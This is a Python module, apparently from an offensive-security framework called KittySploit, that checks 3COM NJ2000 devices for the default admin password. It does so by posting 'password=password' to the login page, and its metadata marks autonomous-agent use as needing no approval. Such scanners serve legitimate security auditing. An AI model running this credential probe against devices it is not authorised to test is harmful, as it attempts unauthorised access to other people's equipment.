#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""3COM NJ2000 contains a default login vulnerability."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': '3COM NJ2000 - Default Login Detection',
        'description': "3COM NJ2000 contains a default login vulnerability. Default admin login password of 'password' was found. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'default-login', '3com', 'nj2000', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://www.manualslib.com/manual/204158/3com-Intellijack-Nj2000.html?page=12'],
    }

    def run(self):
        path = '/login.html'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='password=password\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('<title>3Com Corporation Web Interface</title>', '<frame name="mainFrame" src="blank.html">',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='3COM NJ2000 - Default Login detected', path=path)
            return True
        return False

